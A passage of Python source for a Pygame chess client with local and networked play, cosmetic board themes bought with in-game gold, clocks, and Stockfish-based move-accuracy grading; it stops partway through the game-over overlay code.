#!/usr/bin/env python3
"""
Chess GUI — Pygame front-end.
Usage:
  py chess_ui.py local
  py chess_ui.py host [port]
  py chess_ui.py join <ip> [port]
"""

import sys, os, copy, math, threading, queue, socket, json, random, hashlib

# ── Admin auth ─────────────────────────────────────────────────────────────────
ADMIN_HASH = "5931ffd86d51079992e7ed4ebe2ce0779d9843578281431834a5e742deb041eb"


def _is_admin():
    try:
        import ctypes
        return bool(ctypes.windll.shell32.IsUserAnAdmin())
    except AttributeError:
        try:
            return os.getuid() == 0
        except AttributeError:
            return False
import pygame

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from chess import (
    EMPTY, W, B, PIECE_VALUES, DEFAULT_PORT,
    make_board, legal_moves, all_legal_moves,
    apply_move, apply_castle, castle_moves,
    is_in_check, is_checkmate, is_stalemate,
    color_of, find_king, _sq_name,
    Connection,
)

# ── Layout ─────────────────────────────────────────────────────────────────────
WINDOW_W, WINDOW_H = 1100, 720
BOARD_X    = 30
BOARD_Y    = 40
SQ         = 80
BOARD_PX   = SQ * 8
SIDEBAR_X  = BOARD_X + BOARD_PX + 20
SIDEBAR_W  = WINDOW_W - SIDEBAR_X - 10

def update_layout(w, h):
    global WINDOW_W, WINDOW_H, BOARD_X, BOARD_Y, SQ, BOARD_PX, SIDEBAR_X, SIDEBAR_W
    global RESIGN_RECT, DRAW_RECT, SHOP_BTN, FLIP_BTN
    WINDOW_W, WINDOW_H = w, h
    BOARD_X  = 30
    BOARD_Y  = 40
    SQ       = max(40, min(90, (h - 80) // 8))
    BOARD_PX = SQ * 8
    SIDEBAR_X = BOARD_X + BOARD_PX + 20
    SIDEBAR_W = w - SIDEBAR_X - 10
    RESIGN_RECT = pygame.Rect(SIDEBAR_X,        h - 50, 110, 30)
    DRAW_RECT   = pygame.Rect(SIDEBAR_X + 118,  h - 50, 110, 30)
    SHOP_BTN    = pygame.Rect(SIDEBAR_X + 236,  h - 50, 100, 30)
    FLIP_BTN    = pygame.Rect(SIDEBAR_X,        h - 90, 330, 30)

# ── Palette (dbrand-inspired) ──────────────────────────────────────────────────
BG_APP       = (10,  10,  10)
BG_SIDEBAR   = (18,  18,  18)
BG_LIGHT_SQ  = (42,  42,  42)
BG_DARK_SQ   = (22,  22,  22)
BG_SELECTED  = (200, 120,   0)
BG_VALID     = (160,  90,   0)
BG_LAST      = ( 80,  55,   0)
BG_CHECK     = (160,  20,  20)
ORANGE       = (220, 130,   0)
WHITE_TEXT   = (230, 230, 230)
GREY_TEXT    = (100, 100, 100)
GREEN_TEXT   = ( 60, 180,  80)
RED_TEXT     = (210,  55,  55)

ACC_COLORS = {
    "best":       ( 90, 200,  90),
    "excellent":  (140, 220, 100),
    "good":       (200, 200,  80),
    "inaccuracy": (220, 180,  50),
    "mistake":    (210, 110,  40),
    "blunder":    (190,  40,  40),
}

BOARD_THEMES = {
    "classic":  {"name": "Classic",  "price":   0, "light": (42,  42,  42),  "dark": (22,  22,  22),  "sel": (200, 120,  0), "valid": (160,  90,  0), "last": ( 80,  55,  0), "desc": "Dark terminal"},
    "forest":   {"name": "Forest",   "price":  40, "light": (235, 236, 208), "dark": (115, 149, 82),  "sel": (220, 180, 50), "valid": (170, 130,  0), "last": ( 90,  70,  0), "desc": "Chess.com green"},
    "ocean":    {"name": "Ocean",    "price":  80, "light": (180, 210, 235), "dark": ( 60, 100, 160), "sel": (240, 160, 30), "valid": (190, 120,  0), "last": ( 80,  60,  0), "desc": "Deep blue sea"},
    "midnight": {"name": "Midnight", "price": 120, "light": ( 80,  60, 110), "dark": ( 35,  25,  55), "sel": (190, 100,  0), "valid": (150,  80,  0), "last": ( 70,  45,  0), "desc": "Dark purple"},
    "fire":     {"name": "Fire",     "price": 160, "light": (100,  45,  15), "dark": ( 45,  15,   5), "sel": (220,  70, 20), "valid": (180,  50, 10), "last": (120,  30,  5), "desc": "Burning hot"},
    "ice":      {"name": "Ice",      "price": 200, "light": (200, 225, 245), "dark": ( 90, 140, 200), "sel": (100, 180, 245), "valid": ( 70, 140, 200), "last": ( 50, 100, 160), "desc": "Frozen blue"},
}

PIECE_SKINS = {
    "standard": {"name": "Standard", "price":   0, "w": (245, 245, 245), "b": (190, 115,  35), "ws": (  0,   0,   0), "bs": ( 70,  30,  0), "desc": "Classic white & amber"},
    "neon":     {"name": "Neon",     "price":  80, "w": ( 80, 255, 120), "b": (255,  80, 220), "ws": (  0,  40,   0), "bs": ( 80,   0, 60), "desc": "Glowing neon"},
    "royal":    {"name": "Royal",    "price": 120, "w": (210, 190, 100), "b": (100, 140, 220), "ws": ( 50,  40,   0), "bs": ( 20,  30, 80), "desc": "Gold & silver"},
    "ghost":    {"name": "Ghost",    "price": 160, "w": (200, 205, 230), "b": ( 90, 100, 135), "ws": ( 20,  20,  40), "bs": ( 10,  10, 30), "desc": "Spectral pale"},
    "inferno":  {"name": "Inferno",  "price": 200, "w": (255, 210,  80), "b": (200,  50,  10), "ws": ( 80,  50,   0), "bs": ( 60,  10,  0), "desc": "Gold & ember"},
}

if getattr(sys, 'frozen', False):
    _BASE = os.path.dirname(sys.executable)
else:
    _BASE = os.path.dirname(os.path.abspath(__file__))
SAVE_PATH = os.path.join(_BASE, "chess_save.json")

# ── Time controls ───────────────────────────────────────────────────────────────
# (label, total_seconds or None, increment_seconds)
TIME_CONTROLS = [
    ("No time",  None, 0),
    ("1 + 3",    60,   3),
    ("5 min",    300,  0),
    ("10 min",   600,  0),
    ("30 min",   1800, 0),
    ("60 min",   3600, 0),
]

def _fmt_clock(t):
    """Format seconds as M:SS, or S.d when under 20 s, or ∞ when None."""
    if t is None: return "∞"
    if t < 20:    return f"{t:.1f}"
    t = int(t)
    m, s = divmod(t, 60)
    return f"{m}:{s:02d}"

# ── Relay server (fill in after deploying relay.py) ────────────────────────────
RELAY_HOST = "turntable.proxy.rlwy.net"
RELAY_PORT = 39077


def load_save():
    default = {"gold": 50, "wins": 0, "losses": 0, "draws": 0,
               "owned_themes": ["classic"], "owned_skins": ["standard"],
               "active_theme": "classic", "active_skin": "standard"}
    try:
        with open(SAVE_PATH) as f:
            d = json.load(f)
        for k, v in default.items():
            d.setdefault(k, v)
        return d
    except Exception:
        return dict(default)


def save_data(d):
    try:
        with open(SAVE_PATH, "w") as f:
            json.dump(d, f, indent=2)
    except Exception:
        pass


def apply_theme(save):
    """Update module-level color globals from save data."""
    t = BOARD_THEMES.get(save.get("active_theme", "classic"), BOARD_THEMES["classic"])
    s = PIECE_SKINS.get(save.get("active_skin", "standard"), PIECE_SKINS["standard"])
    global BG_LIGHT_SQ, BG_DARK_SQ, BG_SELECTED, BG_VALID, BG_LAST
    BG_LIGHT_SQ = t["light"]; BG_DARK_SQ = t["dark"]
    BG_SELECTED = t["sel"];   BG_VALID   = t["valid"]; BG_LAST = t["last"]
    PIECE_FG[W]     = s["w"];  PIECE_FG[B]     = s["b"]
    PIECE_SHADOW[W] = s["ws"]; PIECE_SHADOW[B] = s["bs"]


PIECE_GLYPHS = {
    "wK": "♔", "wQ": "♕", "wR": "♖", "wB": "♗", "wN": "♘", "wP": "♙",
    "bK": "♚", "bQ": "♛", "bR": "♜", "bB": "♝", "bN": "♞", "bP": "♟",
}
PIECE_FG     = {W: (245, 245, 245), B: (190, 115, 35)}   # white vs warm amber
PIECE_SHADOW = {W: (0, 0, 0),       B: (70,  30,  0)}

FONTS   = {}
screen  = None  # set in main
_save   = None  # loaded on startup


def init_fonts():
    ps = max(20, int(SQ * 0.65))
    FONTS["piece"]      = pygame.font.SysFont("segoeuisymbol,symbola,unifont", ps)
    FONTS["piece_sm"]   = pygame.font.SysFont("segoeuisymbol,symbola,unifont", max(12, ps // 2))
    FONTS["piece_hist"] = pygame.font.SysFont("segoeuisymbol,symbola,unifont", max(10, ps // 3))
    FONTS["sm"]       = pygame.font.SysFont("segoeui,arial", 14)
    FONTS["md"]       = pygame.font.SysFont("segoeui,arial", 18, bold=True)
    FONTS["lg"]       = pygame.font.SysFont("segoeui,arial", 24, bold=True)
    FONTS["xl"]       = pygame.font.SysFont("segoeui,arial", 40, bold=True)
    FONTS["coord"]    = pygame.font.SysFont("segoeui,arial", max(9, int(SQ * 0.14)))


# ── Game state ─────────────────────────────────────────────────────────────────

class GameState:
    def __init__(self):
        self.board             = make_board()
        self.turn              = W
        self.en_passant        = None
        self.castling          = {"wK": True, "wQ": True, "bK": True, "bQ": True}
        self.selected          = None
        self.valid_moves       = []
        self.last_move         = []
        self.move_history      = []   # list of dicts: board, last_move, label, fen_after, color
        self.move_num          = 1
        self.game_over         = False
        self.result            = ""   # "white_wins" | "black_wins" | "draw"
        self.winner            = None # W, B, or None
        self.promotion_pending = None # (fr, fc, tr, tc)


# ── FEN ────────────────────────────────────────────────────────────────────────

def board_to_fen(board, turn, castling, en_passant):
    rows = []
    for rank in range(7, -1, -1):
        s, empty = "", 0
        for file in range(8):
            p = board[rank][file]
            if p == EMPTY:
                empty += 1
            else:
                if empty: s += str(empty); empty = 0
                c, k = p[0], p[1]
                s += k.upper() if c == W else k.lower()
        if empty: s += str(empty)
        rows.append(s)
    active = "w" if turn == W else "b"
    cr = ("K" if castling.get("wK") else "") + ("Q" if castling.get("wQ") else "") + \
         ("k" if castling.get("bK") else "") + ("q" if castling.get("bQ") else "")
    cr = cr or "-"
    ep = (chr(ord("a") + en_passant[1]) + str(en_passant[0] + 1)) if en_passant else "-"
    return f"{'/'.join(rows)} {active} {cr} {ep} 0 1"


# ── Accuracy ───────────────────────────────────────────────────────────────────

def cp_to_win_pct(cp):
    return 50 + 50 * (2 / (1 + math.exp(-0.00368208 * max(-1000, min(1000, cp)))) - 1)

def move_accuracy(wp_before, wp_after):
    delta = max(0.0, wp_before - wp_after)
    return max(0.0, min(100.0, 103.1668 * math.exp(-0.04354 * delta) - 3.1669))

def classify_move(acc):
    if acc >= 99.5: return "best"
    if acc >= 90.0: return "excellent"
    if acc >= 75.0: return "good"
    if acc >= 60.0: return "inaccuracy"
    if acc >= 40.0: return "mistake"
    return "blunder"


class StockfishAnalyzer:
    def __init__(self):
        self.sf        = None
        self.available = False
        try:
            from stockfish import Stockfish
            import glob
            base = os.path.dirname(os.path.abspath(__file__))
            candidates = [
                os.path.join(base, "stockfish", "stockfish.exe"),
                os.path.join(base, "stockfish.exe"),
            ] + glob.glob(os.path.join(base, "stockfish", "*.exe"))
            for p in candidates:
                if os.path.exists(p):
                    self.sf = Stockfish(path=p, depth=14,
                                        parameters={"Threads": 2, "Hash": 64})
                    self.available = True
                    break
        except Exception:
            pass

    def eval_fen(self, fen):
        if not self.available: return None
        try:
            self.sf.set_fen_position(fen)
            ev = self.sf.get_evaluation()
            if ev["type"] == "cp":    return float(ev["value"])
            if ev["type"] == "mate":  return 10000.0 if ev["value"] > 0 else -10000.0
        except Exception:
            self.available = False
        return None


class AccuracyTracker:
    def __init__(self, analyzer: StockfishAnalyzer):
        self.analyzer = analyzer
        self._q       = queue.Queue()
        self._results = {}
        self._lock    = threading.Lock()
        if analyzer.available:
            threading.Thread(target=self._worker, daemon=True).start()

    def submit(self, idx, fen_before, fen_after, color):
        if self.analyzer.available:
            self._q.put((idx, fen_before, fen_after, color))

    def get(self, idx):
        with self._lock:
            return self._results.get(idx)

    def avg_accuracy(self, color, n_moves):
        accs = []
        start = 0 if color == W else 1
        with self._lock:
            for i in range(start, n_moves, 2):
                r = self._results.get(i)
                if r: accs.append(r["accuracy"])
        return sum(accs) / len(accs) if accs else None

    def stop(self):
        try: self._q.put(None)
        except: pass

    def _worker(self):
        while True:
            item = self._q.get()
            if item is None: break
            idx, fen_before, fen_after, color = item
            sign = 1.0 if color == W else -1.0
            cp_b = self.analyzer.eval_fen(fen_before)
            cp_a = self.analyzer.eval_fen(fen_after)
            if cp_b is not None and cp_a is not None:
                wp_before = cp_to_win_pct(cp_b * sign)
                wp_after  = cp_to_win_pct(-cp_a * sign)
                acc = move_accuracy(wp_before, wp_after)
                with self._lock:
                    self._results[idx] = {"accuracy": acc, "classification": classify_move(acc)}
            self._q.task_done()


# ── Coordinate helpers ─────────────────────────────────────────────────────────

def sq_rect(r, c, flip):
    dc = (7 - c) if flip else c
    dr = r        if flip else (7 - r)
    return pygame.Rect(BOARD_X + dc * SQ, BOARD_Y + dr * SQ, SQ, SQ)

def pixel_to_square(px, py, flip):
    bx, by = px - BOARD_X, py - BOARD_Y
    if not (0 <= bx < BOARD_PX and 0 <= by < BOARD_PX):
        return None
    dc, dr = bx // SQ, by // SQ
    c = (7 - dc) if flip else dc
    r = dr        if flip else (7 - dr)
    return (r, c)


# ── Arrow / highlight overlay ──────────────────────────────────────────────────

def _draw_arrow_on(surf, sq1, sq2, flip, col=(80, 190, 80)):
    r1, c1 = sq1; r2, c2 = sq2
    rect1  = sq_rect(r1, c1, flip)
    rect2  = sq_rect(r2, c2, flip)
    sx, sy = float(rect1.centerx), float(rect1.centery)
    ex, ey = float(rect2.centerx), float(rect2.centery)
    dx, dy = ex - sx, ey - sy
    ln = math.hypot(dx, dy)
    if ln < 1: return
    ux, uy = dx / ln, dy / ln
    px, py = -uy, ux
    shaft_w, head_w, head_len = 11, 24, 28
    start = SQ * 0.28
    sx2, sy2   = sx + ux * start, sy + uy * start
    shaft_ex   = ex - ux * head_len
    shaft_ey   = ey - uy * head_len
    pts_shaft  = [
        (sx2     + px * shaft_w/2, sy2     + py * shaft_w/2),
        (sx2     - px * shaft_w/2, sy2     - py * shaft_w/2),
        (shaft_ex - px * shaft_w/2, shaft_ey - py * shaft_w/2),
        (shaft_ex + px * shaft_w/2, shaft_ey + py * shaft_w/2),
    ]
    pts_head = [
        (ex, ey),
        (shaft_ex + px * head_w/2, shaft_ey + py * head_w/2),
        (shaft_ex - px * head_w/2, shaft_ey - py * head_w/2),
    ]
    pygame.draw.polygon(surf, (*col, 175), pts_shaft)
    pygame.draw.polygon(surf, (*col, 175), pts_head)


def draw_board_overlays(surf, arrows, sq_highlights, flip):
    if not arrows and not sq_highlights: return
    ov = pygame.Surface((WINDOW_W, WINDOW_H), pygame.SRCALPHA)
    ov.fill((0, 0, 0, 0))
    for sq, col in sq_highlights.items():
        rect = sq_rect(sq[0], sq[1], flip)
        pygame.draw.rect(ov, (*col, 110), rect)
    for sq1, sq2, col in arrows:
        _draw_arrow_on(ov, sq1, sq2, flip, col)
    surf.blit(ov, (0, 0))


# ── Piece drawing ──────────────────────────────────────────────────────────────

def draw_piece(surf, piece_str, rect, fg=None, shadow_col=None):
    glyph = PIECE_GLYPHS.get(piece_str)
    if not glyph: return
    if fg is None:         fg         = PIECE_FG[piece_str[0]]
    if shadow_col is None: shadow_col = PIECE_SHADOW[piece_str[0]]
    for dx, dy in ((-1, 0), (1, 0), (0, -1), (0, 1)):
        s = FONTS["piece"].render(glyph, True, shadow_col)
        surf.blit(s, s.get_rect(center=(rect.centerx + dx, rect.centery + dy)))
    s = FONTS["piece"].render(glyph, True, fg)
    surf.blit(s, s.get_rect(center=rect.center))


# ── Board drawing ──────────────────────────────────────────────────────────────

def draw_board(surf, gs: GameState, flip: bool, board_override=None, last_move_override=None,
               my_theme_data=None, opp_theme_data=None, my_skin_data=None, opp_skin_data=None,
               skip_sq=None):
    board     = board_override if board_override is not None else gs.board
    last_move = last_move_override if last_move_override is not None else gs.last_move
    reviewing = board_override is not None
    split     = my_theme_data is not None and opp_theme_data is not None

    valid_set = set() if reviewing else set(gs.valid_moves)
    last_set  = set(map(tuple, last_move)) if last_move else set()
    king_sq   = find_king(board, gs.turn) if not gs.game_over and not reviewing else None
    in_chk    = bool(king_sq and is_in_check(board, gs.turn))

    for r in range(8):
        for c in range(8):
            rect       = sq_rect(r, c, flip)
            is_light   = (r + c) % 2 == 1
            sq         = (r, c)
            dr         = r if flip else (7 - r)   # screen row: 0=top 7=bottom
            is_my_half = dr >= 4

            if split:
                td   = my_theme_data if is_my_half else opp_theme_data
                base = td["light"] if is_light else td["dark"]
            else:
                base = BG_LIGHT_SQ if is_light else BG_DARK_SQ

            if not reviewing and gs.selected and sq == gs.selected:
                col = BG_SELECTED
            elif sq in last_set:
                col = BG_LAST
            elif in_chk and sq == king_sq:
                col = BG_CHECK
            else:
                col = base
            pygame.draw.rect(surf, col, rect)

            if sq in valid_set:
                if board[r][c] == EMPTY:
                    pygame.draw.circle(surf, BG_VALID, rect.center, 12)
                else:
                    pygame.draw.circle(surf, BG_VALID, rect.center, SQ // 2 - 4, 5)

            p = board[r][c]
            if p != EMPTY and (skip_sq is None or (r, c) != skip_sq):
                if split and my_skin_data and opp_skin_data:
                    sd  = my_skin_data if is_my_half else opp_skin_data
                    fg  = sd["w"] if p[0] == W else sd["b"]
                    shd = sd["ws"] if p[0] == W else sd["bs"]
                    draw_piece(surf, p, rect, fg=fg, shadow_col=shd)
                else:
                    draw_piece(surf, p, rect)

    if split:
        dy = BOARD_Y + 4 * SQ
        pygame.draw.line(surf, (70, 70, 70), (BOARD_X, dy), (BOARD_X + BOARD_PX, dy), 2)

    # Coordinate labels — file letters across the bottom, rank numbers down the left
    for dc in range(8):
        actual_file = (7 - dc) if flip else dc
        x = BOARD_X + dc * SQ
        y = BOARD_Y + 7 * SQ
        lbl = FONTS["coord"].render(chr(ord("a") + actual_file), True, GREY_TEXT)
        surf.blit(lbl, (x + 3, y + SQ - 13))
    for dr in range(8):
        actual_rank = dr if flip else (7 - dr)
        x = BOARD_X
        y = BOARD_Y + dr * SQ
        lbl = FONTS["coord"].render(str(actual_rank + 1), True, GREY_TEXT)
        surf.blit(lbl, (x + 3, y + 3))


# ── Castling rights update ─────────────────────────────────────────────────────

def _update_castling(gs: GameState):
    for col in (W, B):
        rk = 0 if col == W else 7
        if gs.board[rk][4] != col + "K":
            gs.castling[col+"K"] = gs.castling[col+"Q"] = False
        if gs.board[rk][7] != col + "R": gs.castling[col+"K"] = False
        if gs.board[rk][0] != col + "R": gs.castling[col+"Q"] = False


# ── Move execution ─────────────────────────────────────────────────────────────

def _record_and_advance(gs: GameState, tracker, fen_before, fen_after, label, piece=""):
    idx = len(gs.move_history)
    tracker.submit(idx, fen_before, fen_after, gs.turn)
    num_str = f"{gs.move_num}." if gs.turn == W else f"{gs.move_num}..."
    gs.move_history.append({
        "board":     copy.deepcopy(gs.board),
        "last_move": list(gs.last_move),
        "label":     f"{num_str} {label}",
        "fen_after": fen_after,
        "color":     gs.turn,
        "idx":       idx,
        "piece":     piece,
        "capture":   "×" in label,
    })
    if gs.turn == B:
        gs.move_num += 1
    gs.selected    = None
    gs.valid_moves = []
    gs.turn = B if gs.turn == W else W


def _check_end(gs: GameState):
    if is_checkmate(gs.board, gs.turn, gs.en_passant):
        gs.game_over = True
        gs.winner    = W if gs.turn == B else B
        gs.result    = "white_wins" if gs.winner == W else "black_wins"
        return "checkmate"
    if is_stalemate(gs.board, gs.turn, gs.en_passant):
        gs.game_over = True
        gs.winner    = None
        gs.result    = "draw"
        return "stalemate"
    return None


def do_move(gs: GameState, fr, fc, tr, tc, tracker, conn=None, promo="Q"):
    piece      = gs.board[fr][fc]
    fen_before = board_to_fen(gs.board, gs.turn, gs.castling, gs.en_passant)

    if piece[1] == "K" and abs(fc - tc) == 2:
        side = "k" if tc > fc else "q"
        gs.board = apply_castle(gs.board, gs.turn, side)
        gs.castling[gs.turn+"K"] = gs.castling[gs.turn+"Q"] = False
        gs.en_passant = None
        gs.last_move = [(fr, fc), (tr, tc)]
        label = "O-O" if side == "k" else "O-O-O"
        if conn: conn.send({"type": "castle", "side": side})
    else:
        is_capture = gs.board[tr][tc] != EMPTY or (
            piece[1] == "P" and fc != tc and gs.board[tr][tc] == EMPTY  # en passant
        )
        gs.board, gs.en_passant = apply_move(gs.board, fr, fc, tr, tc, gs.en_passant, promo)
        gs.last_move = [(fr, fc), (tr, tc)]
        pname = {"P": "", "R": "R", "N": "N", "B": "B", "Q": "Q", "K": "K"}[piece[1]]
        sep   = "×" if is_capture else "→"
        label = f"{pname}{_sq_name(fr,fc)}{sep}{_sq_name(tr,tc)}"
        if promo != "Q" and piece[1] == "P": label += f"={promo}"
        if conn: conn.send({"type":"move","from_r":fr,"from_c":fc,
                             "to_r":tr,"to_c":tc,"promotion":promo})

    _update_castling(gs)
    fen_after = board_to_fen(gs.board, gs.turn, gs.castling, gs.en_passant)
    _record_and_advance(gs, tracker, fen_before, fen_after, label, piece=piece)
    return _check_end(gs)


def apply_opponent_move(gs: GameState, data: dict, tracker):
    if data["type"] == "move":
        fr, fc  = data["from_r"], data["from_c"]
        tr, tc  = data["to_r"],   data["to_c"]
        promo   = data.get("promotion", "Q")
        do_move(gs, fr, fc, tr, tc, tracker, conn=None, promo=promo)
    elif data["type"] == "castle":
        side = data["side"]
        rk   = 0 if gs.turn == W else 7
        kc   = 4
        tc   = 6 if side == "k" else 2
        do_move(gs, rk, kc, rk, tc, tracker, conn=None, promo="Q")


def try_recv(conn):
    """Non-blocking: returns dict or None."""
    try:
        conn.sock.setblocking(False)
        while b"\n" not in conn.buf:
            chunk = conn.sock.recv(4096)
            if not chunk:
                raise ConnectionError("closed")
            conn.buf += chunk
        line, conn.buf = conn.buf.split(b"\n", 1)
        return json.loads(line)
    except (BlockingIOError, OSError):
        return None
    except ConnectionError:
        raise
    finally:
        try: conn.sock.setblocking(True)
        except: pass


# ── Sidebar ────────────────────────────────────────────────────────────────────

RESIGN_RECT = pygame.Rect(SIDEBAR_X,        WINDOW_H - 50, 110, 30)
DRAW_RECT   = pygame.Rect(SIDEBAR_X + 118,  WINDOW_H - 50, 110, 30)
SHOP_BTN    = pygame.Rect(SIDEBAR_X + 236,  WINDOW_H - 50, 100, 30)
FLIP_BTN    = pygame.Rect(SIDEBAR_X,        WINDOW_H - 90, 330, 30)

def draw_sidebar(surf, gs: GameState, tracker, scroll: int, flip_manual: bool = False,
                 w_time=None, b_time=None, increment=0) -> pygame.Rect | None:
    pygame.draw.rect(surf, BG_SIDEBAR, (SIDEBAR_X - 8, 0, SIDEBAR_W + 18, WINDOW_H))

    y = 14
    surf.blit(FONTS["xl"].render("CHESS", True, ORANGE),
              (SIDEBAR_X, y))
    if _save is not None:
        gs_lbl = FONTS["sm"].render(f"{_save['gold']}g", True, (220, 180, 50))
        surf.blit(gs_lbl, (SIDEBAR_X + SIDEBAR_W - gs_lbl.get_width() - 5, 18))
    y += 48

    # Material
    w_val = sum(PIECE_VALUES.get(p[1], 0) for row in gs.board for p in row
                if p != EMPTY and p[0] == W)
    b_val = sum(PIECE_VALUES.get(p[1], 0) for row in gs.board for p in row
                if p != EMPTY and p[0] == B)
    diff  = w_val - b_val
    if   diff > 0: adv = f"+{diff} White";  adv_col = WHITE_TEXT
    elif diff < 0: adv = f"+{-diff} Black"; adv_col = GREY_TEXT
    else:          adv = "Equal";            adv_col = GREY_TEXT
    surf.blit(FONTS["md"].render(f"Material  {adv}", True, adv_col),
              (SIDEBAR_X, y)); y += 30

    pygame.draw.line(surf, (40,40,40), (SIDEBAR_X, y), (SIDEBAR_X + SIDEBAR_W - 10, y)); y += 10

    # Status
    if not gs.game_over:
        who = "White" if gs.turn == W else "Black"
        chk = "  CHECK!" if is_in_check(gs.board, gs.turn) else ""
        col = RED_TEXT if chk else (WHITE_TEXT if gs.turn == W else GREY_TEXT)
        surf.blit(FONTS["md"].render(f"{who}'s turn{chk}", True, col), (SIDEBAR_X, y))
    else:
        msg = {"white_wins": "White wins!", "black_wins": "Black wins!", "draw": "Draw"}
        col = WHITE_TEXT if gs.result == "white_wins" else GREY_TEXT
        surf.blit(FONTS["md"].render(msg.get(gs.result, ""), True, col), (SIDEBAR_X, y))
    y += 30

    pygame.draw.line(surf, (40,40,40), (SIDEBAR_X, y), (SIDEBAR_X + SIDEBAR_W - 10, y)); y += 8

    # Clocks
    if w_time is not None or b_time is not None:
        half_w = (SIDEBAR_W - 14) // 2
        for col, t, label, is_active in (
            (W, w_time, "White", gs.turn == W and not gs.game_over),
            (B, b_time, "Black", gs.turn == B and not gs.game_over),
        ):
            xoff = SIDEBAR_X if col == W else SIDEBAR_X + half_w + 8
            low  = t is not None and t < 30
            bg   = (50, 20, 20) if (low and is_active) else ((40, 40, 40) if is_active else (22, 22, 22))
            tc   = (255, 80, 80) if (low and is_active) else (WHITE_TEXT if is_active else GREY_TEXT)
            box  = pygame.Rect(xoff, y, half_w, 42)
            pygame.draw.rect(surf, bg, box, border_radius=6)
            if is_active:
                pygame.draw.rect(surf, ORANGE if not low else (220, 60, 60), box, 2, border_radius=6)
            lbl_s = FONTS["sm"].render(label, True, GREY_TEXT)
            surf.blit(lbl_s, (xoff + 6, y + 4))
            time_s = FONTS["lg"].render(_fmt_clock(t), True, tc)
            surf.blit(time_s, time_s.get_rect(center=(box.centerx, y + 28)))
        y += 48
        if increment:
            inc_s = FONTS["sm"].render(f"+{increment}s increment", True, GREY_TEXT)
            surf.blit(inc_s, (SIDEBAR_X, y)); y += 16
        pygame.draw.line(surf, (40,40,40), (SIDEBAR_X, y), (SIDEBAR_X + SIDEBAR_W - 10, y)); y += 8

    # Move history header
    surf.blit(FONTS["sm"].render("MOVE HISTORY", True, GREY_TEXT), (SIDEBAR_X, y)); y += 18

    HIST_H   = 222
    ROW_H    = 22
    hist_buf = pygame.Surface((SIDEBAR_W, HIST_H), pygame.SRCALPHA)
    hist_buf.fill((0, 0, 0, 0))

    # Build (white_move, black_move) pairs
    pairs = []
    for m in gs.move_history:
        if m["color"] == W:
            pairs.append([m, None])
        elif pairs:
            pairs[-1][1] = m
        else:
            pairs.append([None, m])

    max_scroll = max(0, len(pairs) * ROW_H - HIST_H)
    scroll     = max(0, min(scroll, max_scroll))

    for i, (wm, bm) in enumerate(pairs):
        hy = i * ROW_H - scroll
        if hy + ROW_H < 0 or hy > HIST_H: continue
        hist_buf.blit(FONTS["sm"].render(f"{i+1}.", True, GREY_TEXT), (0, hy + 4))

        for move, x_off in ((wm, 28), (bm, 155)):
            if move is None: continue
            acc      = tracker.get(move["idx"]) if tracker else None
            base_col = WHITE_TEXT if move["color"] == W else GREY_TEXT
            txt_col  = ACC_COLORS.get(acc["classification"], base_col) if acc else base_col
            raw_lbl  = move["label"].split(" ", 1)[1] if " " in move["label"] else move["label"]
            is_cap   = move.get("capture", False)

            # Piece glyph
            cx = x_off
            glyph = PIECE_GLYPHS.get(move.get("piece", ""), "")
            if glyph:
                g_col  = PIECE_FG.get(move["piece"][0], txt_col)
                g_surf = FONTS["piece_hist"].render(glyph, True, g_col)
                hist_buf.blit(g_surf, (cx, hy + 3))
                cx += g_surf.get_width() + 1

            # Move text — red tint on captures
            lbl_col = (220, 80, 80) if is_cap else txt_col
            ls = FONTS["sm"].render(raw_lbl, True, lbl_col)
            hist_buf.blit(ls, (cx, hy + 4))
            if acc:
                dot_c = ACC_COLORS.get(acc["classification"], GREY_TEXT)
                pygame.draw.circle(hist_buf, dot_c, (cx + ls.get_width() + 7, hy + ROW_H // 2), 4)

    surf.blit(hist_buf, (SIDEBAR_X, y)); y += HIST_H + 6

    pygame.draw.line(surf, (40,40,40), (SIDEBAR_X, y), (SIDEBAR_X + SIDEBAR_W - 10, y)); y += 8

    mouse = pygame.mouse.get_pos()

    # Flip Board button
    hover_f = FLIP_BTN.collidepoint(mouse)
    flip_col = (50, 90, 140) if flip_manual else ((25, 60, 100) if hover_f else (15, 35, 60))
    pygame.draw.rect(surf, flip_col, FLIP_BTN, border_radius=5)
    fs = FONTS["sm"].render("⇅  Flip Board", True, WHITE_TEXT)
    surf.blit(fs, fs.get_rect(center=FLIP_BTN.center))

    if not gs.game_over:
        # Resign
        hover = RESIGN_RECT.collidepoint(mouse)
        pygame.draw.rect(surf, ORANGE if hover else (55, 30, 0), RESIGN_RECT, border_radius=5)
        rs = FONTS["sm"].render("Resign", True, (10,10,10) if hover else WHITE_TEXT)
        surf.blit(rs, rs.get_rect(center=RESIGN_RECT.center))
        # Offer Draw
        hover_d = DRAW_RECT.collidepoint(mouse)
        pygame.draw.rect(surf, (20, 80, 80) if hover_d else (10, 45, 45), DRAW_RECT, border_radius=5)
        ds = FONTS["sm"].render("Offer Draw", True, WHITE_TEXT)
        surf.blit(ds, ds.get_rect(center=DRAW_RECT.center))

    # Shop
    hover_s = SHOP_BTN.collidepoint(mouse)
    pygame.draw.rect(surf, (30, 80, 30) if hover_s else (15, 45, 15), SHOP_BTN, border_radius=5)
    ss = FONTS["sm"].render("Shop", True, WHITE_TEXT)
    surf.blit(ss, ss.get_rect(center=SHOP_BTN.center))

    if not gs.game_over:
        return RESIGN_RECT
    return None


# ── Promotion overlay ──────────────────────────────────────────────────────────

def draw_promo_overlay(surf, color):
    ov = pygame.Surface((WINDOW_W, WINDOW_H), pygame.SRCALPHA)
    ov.fill((0, 0, 0, 180)); surf.blit(ov, (0, 0))
    pieces = ["Q", "R", "B", "N"]
    pw, pad = 80, 10
    total_w = len(pieces) * pw + (len(pieces) - 1) * pad
    px = (WINDOW_W - total_w) // 2
    py = (WINDOW_H - pw) // 2
    panel = pygame.Rect(px - 14, py - 14, total_w + 28, pw + 28)
    pygame.draw.rect(surf, BG_SIDEBAR, panel, border_radius=8)
    pygame.draw.rect(surf, ORANGE,     panel, 2, border_radius=8)
    rects = []
    for i, p in enumerate(pieces):
        r = pygame.Rect(px + i * (pw + pad), py, pw, pw)
        pygame.draw.rect(surf, BG_DARK_SQ, r, border_radius=6)
        draw_piece(surf, color + p, r)
        rects.append((p, r))
    return rects


# ── Game-over overlay ──────────────────────────────────────────────────────────

def _gameover_rects():
    panel  = pygame.Rect(200, 160, 700, 360)
    by     = panel.bottom - 56
    review = pygame.Rect(panel.centerx - 195, by, 120, 36)
    again  = pygame.Rect(panel.centerx -  60, by, 120, 36)
    quit_  = pygame.Rect(panel.centerx +  75, by, 120, 36)
